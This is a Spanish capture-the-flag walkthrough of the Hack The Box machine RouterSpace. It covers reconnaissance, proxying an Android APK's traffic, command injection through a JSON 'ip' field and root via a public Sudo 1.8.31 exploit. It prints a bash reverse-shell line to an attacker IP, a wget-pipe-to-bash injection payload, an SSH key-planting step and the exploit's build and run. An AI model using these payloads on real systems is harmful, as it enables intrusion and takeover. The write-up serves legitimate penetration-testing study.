---
layout: post
title: RouterSpace
date: 2023-02-09
description:
img:
fig-caption:
tags: [eWPT]
---
___

<center><img src="/writeups/assets/img/Routerspace-htb/RouterSpace.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Debbugging APK

* Proxy con Android

* Inyección de comandos en petición por POST

* Abuso Sudo version 1.8.31 (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.148 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-09 09:34 GMT
Nmap scan report for 10.10.11.148
Host is up (0.098s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.99 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.148 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-09 09:36 GMT
Nmap scan report for 10.10.11.148
Host is up (0.040s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-RouterSpace Packet Filtering V1
| ssh-hostkey: 
|   3072 f4e4c80aa6af6693af695aa9bc75f90c (RSA)
|   256 7f05cd8c427ba94ab2e6352cc4597802 (ECDSA)
|_  256 2fd7a88bbe2d10b0c9b42952a8942478 (ED25519)
80/tcp open  http
|_http-trane-info: Problem with XML parsing of /evox/about
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-15617
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 65
|     ETag: W/"41-NSQpJCoNfvYx1ZojR7ZPciF81Zo"
|     Date: Thu, 09 Feb 2023 09:36:15 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: N vn 9 Qwa 9 }
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-96175
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Thu, 09 Feb 2023 09:36:14 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-4752
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Thu, 09 Feb 2023 09:36:14 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-title: RouterSpace
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.93%I=7%D=2/9%Time=63E4BE8E%P=x86_64-pc-linux-gnu%r(NULL,
SF:29,"SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.93%I=7%D=2/9%Time=63E4BE8E%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,2E83,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX
SF:-Cdn:\x20RouterSpace-96175\r\nAccept-Ranges:\x20bytes\r\nCache-Control:
SF:\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x202021
SF:\x2011:33:57\x20GMT\r\nETag:\x20W/\"652c-17d476c9285\"\r\nContent-Type:
SF:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x2
SF:0Thu,\x2009\x20Feb\x202023\x2009:36:14\x20GMT\r\nConnection:\x20close\r
SF:\n\r\n<!doctype\x20html>\n<html\x20class=\"no-js\"\x20lang=\"zxx\">\n<h
SF:ead>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<met
SF:a\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\x20\x
SF:20\x20<title>RouterSpace</title>\n\x20\x20\x20\x20<meta\x20name=\"descr
SF:iption\"\x20content=\"\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\x
SF:20content=\"width=device-width,\x20initial-scale=1\">\n\n\x20\x20\x20\x
SF:20<link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\">\n\x2
SF:0\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/owl\.carousel\.m
SF:in\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/m
SF:agnific-popup\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20h
SF:ref=\"css/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"sty
SF:lesheet\"\x20href=\"css/themify-icons\.css\">\n\x20")%r(HTTPOptions,107
SF:,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20R
SF:outerSpace-4752\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/htm
SF:l;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\"d-bMedpZYG
SF:rVt1nR4x\+qdNZ2GqyRo\"\r\nDate:\x20Thu,\x2009\x20Feb\x202023\x2009:36:1
SF:4\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST")%r(RTSPRequest,2
SF:F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")
SF:%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20cl
SF:ose\r\n\r\n")%r(FourOhFourRequest,127,"HTTP/1\.1\x20200\x20OK\r\nX-Powe
SF:red-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-15617\r\nContent-Type:\
SF:x20text/html;\x20charset=utf-8\r\nContent-Length:\x2065\r\nETag:\x20W/\
SF:"41-NSQpJCoNfvYx1ZojR7ZPciF81Zo\"\r\nDate:\x20Thu,\x2009\x20Feb\x202023
SF:\x2009:36:15\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20activi
SF:ty\x20detected\x20!!!\x20{RequestID:\x20N\x20vn\x20\x20\x209\x20\x20Qwa
SF:\x209\x20}\n\n\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.63 seconds
```

## Puerto 80 (HTTP)

Con whatweb, analizo las tecnologías que emplea el servidor web

```null
whatweb http://10.10.11.148
http://10.10.11.148 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.11.148], JQuery[1.12.4], Modernizr[3.5.0.min], Script, Title[RouterSpace], UncommonHeaders[x-cdn], X-Powered-By[RouterSpace], X-UA-Compatible[ie=edge]
```

La página principal se ve así:

<img src="/writeups/assets/img/Routerspace-htb/1.png" alt="">

Puedo descargar un APK

<img src="/writeups/assets/img/Routerspace-htb/2.png" alt="">

La descomprimo con ```apktool```

```null
apktool d RouterSpace.apk
I: Using Apktool 2.7.0 on RouterSpace.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /root/.local/share/apktool/framework/1.apk
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Copying unknown files...
I: Copying original files...
```

Ahora puedo ver su contenido desglosado

```null
tree -L 1
.
├── AndroidManifest.xml
├── apktool.yml
├── assets
├── kotlin
├── lib
├── original
├── res
├── smali
└── unknown

7 directories, 2 files
```

Pero no encuentro credenciales, así que desde una máquina android, voy a debuggear la aplicación, tunelizando el tráfico de red por BurpSuite

Descargo una iso de [Android](https://www.android-x86.org/download) que sea compatible con VMWare.

Hago un escaneo por ARP para extraer la IP

```null
arp-scan -I eth1 --localnet
Interface: eth1, type: EN10MB, MAC: 00:0c:29:04:90:3f, IPv4: 10.10.0.130
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.10.0.1	00:50:56:c0:00:02	VMware, Inc.
10.10.0.129	00:0c:29:d4:94:2c	VMware, Inc.
10.10.0.254	00:50:56:f0:60:1a	VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.998 seconds (128.13 hosts/sec). 3 responded
```

Por defecto trae el puerto 5555 abierto

```null
nmap 10.10.0.129
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-09 09:56 GMT
Nmap scan report for 10.10.0.129
Host is up (0.0020s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE
5555/tcp open  freeciv
MAC Address: 00:0C:29:D4:94:2C (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds
```

Me conecto por ADB

```null
adb connect 10.10.0.129
connected to 10.10.0.129:5555

adb devices
List of devices attached
10.10.0.129:5555	device
```

Instalo el APK

```null
adb install RouterSpace.apk
Performing Streamed Install
Success
```

Configuro el proxy para utilizar BurpSuite.

```null
adb shell settings put global http_proxy 10.10.0.130:8080

adb shell settings list global http_proxy | grep proxy
global_http_proxy_exclusion_list=
global_http_proxy_host=10.10.0.130
global_http_proxy_port=8080
global_proxy_pac_url=
http_proxy=10.10.0.130:8080
```

Añado la interfaz al BurpSuite

<img src="/writeups/assets/img/Routerspace-htb/3.png" alt="">

Abro la aplicación para ver en que consiste

<img src="/writeups/assets/img/Routerspace-htb/4.png" alt="">

En el BurpSuite, intercepto la petición

<img src="/writeups/assets/img/Routerspace-htb/5.png" alt="">

Se está aplicando Virtual Hosting. Para poder tener conectividad, añado el dominio routerspace.htb al /etc/hosts

Puedo llegar a ejecutar comandos desde el campo IP

<img src="/writeups/assets/img/Routerspace-htb/6.png" alt="">

Creo un archivo index.html que me envíe una reverse shell

```null
#!/bin/bash
bash -i >& /dev/tcp/10.10.16.5/443 0>&1
```

Introduzo mi payload en el BurpSuite

```null
{"ip":"0.0.0.0; wget${IFS}10.10.16.5|bash"}
```

Pero la máquina cuenta con reglas de Firewall que me impiden ganar acceso. Pero puedo meter mi clave pública en las authorized_keys y conectarme por ssh

```null
cat ~/.ssh/id_rsa.pub | tr -d "\n" | base64 -w 0 | xclip -sel clip
```

<img src="/writeups/assets/img/Routerspace-htb/7.png" alt="">

Me conecto sin proporcionar contraseña

```null
sh paul@routerspace.htb
The authenticity of host 'routerspace.htb (10.10.11.148)' can't be established.
ED25519 key fingerprint is SHA256:iwHQgWKu/VDyjka2Y4j2V8P2Rk6K13HuNT4JTnITIDk.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

paul@routerspace:~$ 
```

Puedo visualizar la primera flag

```null
paul@routerspace:~$ cat user.txt 
306ea8ccdb71778fe4432bc95960da66
```

# Escalada

Dentro de los binario SUID está el sudo

```null
paul@routerspace:/$ find \-perm -4000 2>/dev/null
./usr/bin/su
./usr/bin/passwd
./usr/bin/at
./usr/bin/chsh
./usr/bin/chfn
./usr/bin/mount
./usr/bin/newgrp
./usr/bin/umount
./usr/bin/sudo
./usr/bin/gpasswd
./usr/bin/fusermount
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/eject/dmcrypt-get-device
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/openssh/ssh-keysign
```

Su versión es vulnerable

```null
paul@routerspace:/$ sudo --version
Sudo version 1.8.31
Sudoers policy plugin version 1.8.31
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.31
```

Me descargo el exploit de [Github](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)

```null
git clone https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit
```

Comparto los archivos por scp

```null
scp * paul@routerspace.htb:/tmp/prives
```

Compilo, ejecuto y puedo visualizar la segunda flag

```null
paul@routerspace:/tmp/prives$ ls
exploit.c  Makefile  README.md  shellcode.c
paul@routerspace:/tmp/prives$ make
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c
paul@routerspace:/tmp/prives$ ./exploit 
# whoami
root
# cat /root/root.txt
91f24669a1d2f94fb5a827a7b542ae46
```